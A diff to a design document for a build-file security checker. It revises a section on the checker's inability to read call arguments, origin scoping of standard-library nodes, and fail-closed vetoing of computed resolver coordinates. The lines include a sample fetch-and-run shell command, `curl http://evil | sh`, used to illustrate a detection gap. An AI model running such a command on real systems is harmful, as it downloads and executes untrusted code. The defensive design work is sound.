@@ -268,30 +268,37 @@ $ echo $?
 
 #### Known gap: 2b reads the *call*, not its *arguments* (yet)
 
-The emit carries the resolved `callee` but **not the call's arguments**.
-`http.get("http://1.2.3.4/x")` surfaces `callee: "http_get"` with **no URL**;
-`os.system("curl http://evil | sh")` surfaces `callee: "os_system"` with **no
-command string**. Two consequences:
+The emit carries the resolved `callee` but **not the call's arguments**. So a
+resolver verb surfaces as `callee: "maven_dep"` with **no coordinate**, and the
+rare literal `os.system("curl … | sh")` surfaces as `callee: "os_system"` with
+**no command string**.
 
-- 2b can say *"this build reaches the network / shells out"* but **not** *"…to
-  *this host*."* A **host allowlist** (`deny net except mirror.corp`) is
-  therefore not yet expressible in 2b — it's all-or-nothing on the category.
-- It also exposes why **origin scoping is load-bearing**: a single user
+What a `.build.ae` actually does shapes which gap matters: build files don't
+generally call `http.get(url)` directly — they call **purposeful verbs**
+(`maven.dep("org.foo:bar:1.2.3")`, `pnpm.install("foo@2")`, `cargo.fetch(...)`),
+and the real socket call lives deep inside those SDKs (`--lib`-origin, exempt)
+or in a shelled-out resolver (not even Aether AST). So:
+
+- The high-value argument to read is the **literal coordinate handed to a
+  resolver verb** — the input to a banned/CVE dependency check (Tier B). 2b
+  sees the verb but not yet *which* coordinate.
+- This also shows why **origin scoping is load-bearing**: a single user
   `http.get(...)` explodes into ~10 std-origin nodes from inside
   `std/http/module.ae` (`http_get_raw` — the actual socket — `http_response_*`,
-  `string_concat`, …). All of those are `--lib`-origin and **exempt**; only the
-  user-file `http_get` node trips a `net` rule. Without origin scoping every
-  `http.get` would drag the stdlib's internals into the verdict.
+  `string_concat`, …), all `--lib`-origin and **exempt**; only the user-file
+  verb node trips. Without origin scoping every resolver call would drag the
+  stdlib's internals into the verdict.
 
 Filed upstream: `../aether/veto-emit-ast-args.md` asks for **literal arguments**
-on `function_call` nodes (plus a one-level *provenance* shape for computed args,
-and emitting after const-fold). The discipline that keeps it safe: aeb **never
-allows on a partial/computed argument** — a literal URL is allowlist-checked
-statically; a *computed* URL (`http.get(base + path)`) is **fail-closed
-vetoed**, with the provenance used only to write a precise message. The actual
-host of a computed reach is **layer 3's** job — the `connect()` interceptor sees
-the resolved address regardless of how the URL was built. So: 2b reads literal
-targets pre-build; layer 3 backstops the computed ones at the syscall.
+on `function_call` nodes (plus emitting after const-fold). Coordinates are
+written, not computed, so the literal case is near-total coverage. The
+discipline: aeb **reads a literal coordinate** (banned/allowlist check, static,
+pre-build) and **vetoes any computed argument** to a resolver verb (a build
+that hands a resolver a non-literal coordinate can't be vouched for) — so the
+upstream ask needs only a literal-or-not flag, no expression provenance. The
+*actual* network reach of any resolver is **layer 3's** job — the `connect()`
+interceptor sees the resolved address regardless of how anything was built. So:
+2b reads literal coordinates pre-build; layer 3 backstops the sockets.
 
 ### Layer 3 — runtime containment (the part the source set can't override)
 
